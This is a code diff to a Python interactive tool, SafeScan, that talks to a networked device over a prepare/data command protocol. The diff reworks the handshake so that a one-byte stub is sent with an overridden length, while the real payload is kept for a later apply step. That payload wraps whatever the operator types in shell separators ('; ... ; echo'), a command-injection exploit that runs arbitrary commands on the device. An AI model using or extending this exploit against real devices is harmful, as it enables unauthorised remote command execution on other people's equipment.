@@ -70,17 +70,27 @@ class SafeScan(cmd.Cmd):
         finally:
             return True
 
-    def _send_prepared_payload(self, payload):
-        """Send a payload using the prepare/data handshake."""
+    def _send_prepared_payload(self, payload, *, data_payload=None, length=None):
+        """Send a payload using the prepare/data handshake.
+
+        Some endpoints (like command execution) only require a handshake,
+        while the actual payload is applied later. ``data_payload`` lets us
+        send a minimal buffer during the handshake and reuse ``payload``
+        later without reallocating it. ``length`` overrides the size fields
+        if the target expects a specific value.
+        """
         try:
-            prep_header = struct.pack('<II', len(payload), len(payload))
+            data = payload if data_payload is None else data_payload
+            data_len = len(data) if length is None else length
+
+            prep_header = struct.pack('<II', data_len, data_len)
             self.z.send_command(defs.CMD_PREPARE_DATA, prep_header)
             self.z.recv_reply()
             if not self.z.recvd_ack():
                 print(f"[!] Prepare-data rejected: {hex(self.z.last_reply_code)} {self.z.last_payload_data}")
                 return False
 
-            self.z.send_command(defs.CMD_DATA, payload)
+            self.z.send_command(defs.CMD_DATA, data)
             self.z.recv_reply()
             if not self.z.recvd_ack():
                 print(f"[!] Data payload rejected: {hex(self.z.last_reply_code)} {self.z.last_payload_data}")
@@ -98,7 +108,9 @@ class SafeScan(cmd.Cmd):
         try:
             payload = b"; " + line.encode() + b"; echo\x00\x00"
 
-            if not self._send_prepared_payload(payload):
+            # The device only needs the handshake here; send a 1-byte stub
+            # but keep the real payload for the apply stage.
+            if not self._send_prepared_payload(payload, data_payload=b"a", length=1):
                 return True
 
             apply_payload = bytearray(struct.pack('<I', 1700))
